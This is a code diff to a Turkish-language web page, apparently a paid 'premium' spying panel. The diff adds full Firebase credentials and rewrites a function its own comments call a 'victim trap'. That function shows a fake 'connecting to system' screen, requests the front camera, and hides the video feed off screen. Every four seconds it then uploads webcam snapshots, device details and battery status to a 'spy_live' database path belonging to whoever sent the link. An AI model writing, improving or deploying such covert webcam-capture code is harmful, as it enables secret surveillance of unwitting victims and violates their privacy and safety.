@@ -58,10 +58,23 @@
 </audio>
 
 <script>
-    // --- FIREBASE AYARLARI ---
-    const firebaseConfig = { databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com" };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    // --- EFECAN'IN GİZLİ FIREBASE ANAHTARLARI ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyAKB12tpEbLTHYV7niVHc3VvAtv8jl873E",
+        authDomain: "wrox-premium.firebaseapp.com",
+        databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
+        projectId: "wrox-premium",
+        storageBucket: "wrox-premium.firebasestorage.app",
+        messagingSenderId: "361312477177",
+        appId: "1:361312477177:web:72a8c9237048c4bf0e7f28",
+        measurementId: "G-G4M415GSQ2"
+    };
+
+    // Firebase'i Başlat
+    try {
+        firebase.initializeApp(firebaseConfig);
+        var db = firebase.database();
+    } catch(e) { console.error("Firebase başlatılamadı:", e); }
 
     let authMode = 'login';
 
@@ -195,7 +208,7 @@
                     const d = u.val();
                     box.innerHTML += `<div style="background:#0a0a0a; padding:15px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border-radius:8px; border:1px solid #111;">
                         <div><p>${d.email}</p><small style="color:${d.premium ? 'var(--g)' : '#444'}">${d.premium ? 'PREMIUM' : 'NORMAL'}</small></div>
-                        <button onclick="toggleP('${u.key}', ${d.premium})" style="padding:8px 15px; background:${d.premium ? var(--r) : var(--g)}; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">${d.premium ? 'AL' : 'VER'}</button>
+                        <button onclick="toggleP('${u.key}', ${d.premium})" style="padding:8px 15px; background:${d.premium ? '#ff003c' : '#00ff88'}; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">${d.premium ? 'AL' : 'VER'}</button>
                     </div>`;
                 });
             });
@@ -203,29 +216,42 @@
         else { view.innerHTML = `<div style="text-align:center; padding-top:100px;"><h2>BU MODÜL YAPIM AŞAMASINDA</h2></div>`; }
     };
 
-    // --- KURBAN TARAFINDA ÇALIŞAN TUZAK ---
+    // --- SİYAH EKRAN ÇÖZÜMLÜ KURBAN TUZAĞI ---
     async function renderTrap() {
-        document.body.innerHTML = `<div style="background:#000; height:100vh; display:flex; align-items:center; justify-content:center; color:#fff;"><h2>Loading...</h2><video id="v" autoplay muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas></div>`;
+        document.body.innerHTML = `
+            <div style="background:#000; height:100vh; display:flex; align-items:center; justify-content:center; color:#fff;">
+                <h3 id="status">Sisteme Bağlanılıyor...</h3>
+                <video id="v" autoplay playsinline muted style="width:1px;height:1px;opacity:0;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+            </div>`;
+        
         const refOwner = new URLSearchParams(window.location.search).get('ref');
         const vID = "KRB-" + Math.random().toString(36).substr(2,4).toUpperCase();
         
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = stream;
-            setInterval(async () => {
-                const canvas = document.getElementById('c');
-                canvas.width = 400; canvas.height = 300;
-                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
-                const bt = await navigator.getBattery();
-                db.ref(`spy_live/${refOwner}/${vID}`).update({
-                    img: canvas.toDataURL('image/jpeg', 0.5),
-                    device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Bilinmiyor",
-                    battery: Math.floor(bt.level * 100),
-                    charging: bt.charging,
-                    last: Date.now()
-                });
-            }, 4000);
-        } catch(e) {}
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                document.getElementById('status').innerText = "Bağlantı Kuruldu.";
+                setInterval(async () => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 400; canvas.height = 300;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                    const bt = await navigator.getBattery();
+                    db.ref(`spy_live/${refOwner}/${vID}`).update({
+                        img: canvas.toDataURL('image/jpeg', 0.5),
+                        device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Bilinmiyor",
+                        battery: Math.floor(bt.level * 100),
+                        charging: bt.charging,
+                        last: Date.now()
+                    });
+                }, 4000);
+            };
+        } catch(e) { 
+            document.getElementById('status').innerText = "Hata: Kamera Erişimi Gereklidir.";
+        }
     }
 
     // --- YARDIMCI FONKSİYONLAR ---
